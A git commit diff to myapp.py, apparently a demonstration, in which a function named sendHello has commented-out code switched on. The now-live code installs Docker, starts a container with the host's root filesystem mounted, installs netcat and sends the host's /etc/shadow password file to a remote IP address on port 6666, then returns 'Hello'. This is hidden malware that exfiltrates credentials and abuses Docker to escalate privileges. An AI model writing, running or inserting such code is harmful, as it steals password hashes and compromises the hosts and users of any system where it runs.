a4488adcddaf5c3cf374a7b2d50297430b067164
mydockergit <37586216+mydockergit@users.noreply.github.com>
2018-03-28 12:21:08 +0300

    Update myapp.py

--- myapp.py
+++ myapp.py
@@ -1,10 +1,10 @@
 def sendHello():
-    '''from subprocess import call
+    from subprocess import call
     call(["yum", "-y", "install", "docker"])
     call(["docker", "run", "-dt", "-v", "/:/var/tmp", "--name", "PE", "-h", "PE", "centos", "/bin/bash"])
     call(["docker", "exec", "PE", "yum", "-y", "install", "nc"])
     call(["docker","exec","PE","bash","-c", 'cat /var/tmp/etc/shadow | nc 172.31.49.211 6666']) 
-    print "malicious code"'''
+    print "malicious code"
     return "Hello"
 
 if __name__ == '__main__':
